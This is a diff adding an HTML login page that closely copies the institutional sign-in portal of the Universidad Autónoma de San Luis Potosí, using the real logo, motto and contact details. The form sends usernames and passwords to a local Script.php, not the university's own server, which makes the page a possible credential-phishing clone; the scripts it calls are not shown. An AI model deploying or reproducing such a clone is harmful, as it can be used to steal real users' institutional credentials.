@@ -1,0 +1,123 @@
+    <!DOCTYPE html>
+        <html lang="es">
+
+
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Login</title>
+                <link rel="stylesheet" href="Style.css">
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+            </head>
+
+
+            <body>
+
+
+            <header class="main-header">
+                <div class="container header-container">
+                    <div class="logo-container">
+                        <img src="https://login.uaslp.mx/LoginGateway/Portal/UASLP.png" alt="Logo UASLP" class="logo">
+                        <div class="vertical-line"></div>
+                        <div class="header-text">
+                            <p>Inicio de Sesión Institucional </p>
+                        </div>
+                    </div>
+
+                    <nav class="main-nav">
+                        <ul>
+                            <li><a href="#">Aspirantes</a></li>
+                            <li>|</li>
+                            <li><a href="#">Estudiantes</a></li>
+                            <li>|</li>
+                            <li><a href="#">Egresados</a></li>
+                            <li>|</li>
+                            <li><a href="#">Docentes</a></li>
+                            <li>|</li>
+                            <li><a href="#">Administrativos</a></li>
+                        </ul>
+                    </nav>
+                </div>
+            </header>
+
+
+            <div class="motto-container">
+                <p class="motto">"Siempre autónoma. Por mi patria educaré."</p>
+            </div>
+
+
+            <main class="main-content">
+                <div class="container content-container">
+                    <div class="login-section">
+                        <div class="login-header">
+                            <h3>Servicio de atención a usuarios de TIC 3.0</h3>
+                        </div>
+                        <div class="login-form">
+                            <form id="loginForm" action="Script.php" method="post">
+                                <div class="form-group">
+                                    <label for="username">Usuario:UASLP</label>
+                                    <input type="text" id="username" name="username" required>
+                                </div>
+                                <div class="form-group">
+                                    <label for="password">Contraseña:</label>
+                                    <input type="password" id="password" name="password" required>
+                                </div>
+                                <div class="form-group">
+                                    <button type="submit" class="btn-login">Iniciar sesión</button>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="info-section">
+                        <p class="info-text">Para el uso del Servicio de autenticación, es indispensable contar con una cuenta institucional:</p>
+                        <div class="info-box">
+                            <h4>Administrativos / Docentes</h4>
+                            <p>Pueden ingresar con su cuenta de correo institucional ya que el usuario y contraseña son los mismos. Si no cuenta con su cuenta de correo, lo puede habilitar en el siguiente vínculo: <a href="#" class="link">Habilita correo</a></p>
+                            <p>Para más información, acuda con el Responsable de Tecnología de su Unidad (RTIC). Puede comunicarse a la División de Informática a la cuenta <a href="mailto:servicios.internet@uaslp.mx" class="link">servicios.internet@uaslp.mx</a></p>
+                            <p>Si no recuerda su contraseña, la puede cambiar en el siguiente vínculo: <a href="#" class="link">Cambio de contraseña</a></p>
+                        </div>
+                    </div>
+                </div>
+            </main>
+
+
+            <footer class="main-footer">
+                <div class="container footer-container">
+                    <div class="footer-left">
+                        <div class="social-icons">
+                            <a href="#"><i class="fab fa-facebook-f"></i></a>
+                            <a href="#"><i class="fab fa-twitter"></i></a>
+                            <a href="#"><i class="fab fa-youtube"></i></a>
+                            <a href="#"><i class="fab fa-instagram"></i></a>
+                        </div>
+                        <div class="university-info">
+                            <p>UASLP</p>
+                            <p>Universidad Autónoma de San Luis Potosí</p>
+                            <p>Álvaro Obregón 64, Centro. CP 78000</p>
+                            <p>San Luis Potosí, SLP</p>
+                            <p>444 826 23 00</p>
+                            <p>©2025 Todos los derechos reservados</p>
+                        </div>
+                    </div>
+                    <div class="footer-right">
+                        <nav class="footer-nav">
+                            <ul>
+                                <li><a href="#">Universidad</a></li>
+                                <li><a href="#">Oferta Educativa</a></li>
+                                <li><a href="#">Investigación</a></li>
+                                <li><a href="#">Cultura</a></li>
+                                <li><a href="#">Vinculación</a></li>
+                                <li><a href="#">Internacional</a></li>
+                                <li><a href="#">Correo</a></li>
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </footer>
+
+
+            </body>
+
+
+        <script src="Script.js"></script>
+    </html>
